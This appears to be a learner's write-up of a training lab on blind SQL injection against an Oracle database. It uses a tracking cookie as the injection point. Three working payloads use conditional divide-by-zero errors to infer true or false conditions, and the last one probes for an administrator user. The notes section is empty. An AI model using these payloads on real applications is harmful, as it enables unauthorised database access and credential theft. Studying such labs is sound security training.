---
topic: SQL injection
level: Apprentice
time_spent:
date: 25th Nov, 2026
Database type: Oracle
---
**Vulnerability:** 
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

**Payload:**
```
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
```

- This lab is a bit different from the last Conditional response lab, because this time we do not notice any changes which we can use as a boolean. Here we get an internal server error as an response and here the logic we use is a bit opposite.
- When we run this query the mathematically impossible 1/0 runs through the system and it gives the INTERNAL SERVER ERROR and that is something we can use to our advantage.

![](Blind%20SQL%20injection%20with%20conditional%20errors.md_Attachments/Screenshot%20(79).png)

```
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
```

- Whereas this query does not give as the INTERNAL SERVER ERROR.
![](Blind%20SQL%20injection%20with%20conditional%20errors.md_Attachments/Screenshot%20(80).png)

```
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```
**What I learned:**